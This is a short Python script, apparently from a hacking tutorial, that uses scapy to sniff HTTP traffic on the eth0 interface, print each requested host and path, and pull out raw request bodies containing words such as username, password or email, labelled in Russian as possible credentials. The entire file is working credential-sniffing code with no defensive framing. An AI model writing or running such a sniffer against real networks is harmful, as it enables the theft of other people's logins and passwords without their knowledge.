#!/usr/bin/env python
# -*- coding: utf-8 -*-
import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = [b'username', b"user", b"login", b"password", b"pass", b"email"]
        for keywords in keywords:
            if keywords in load:
                return load




def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print(b"[+] HTTP Request >> " + url)
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Были обнаружены возможные username/password >> ", login_info, "\n\n")





sniff("eth0")
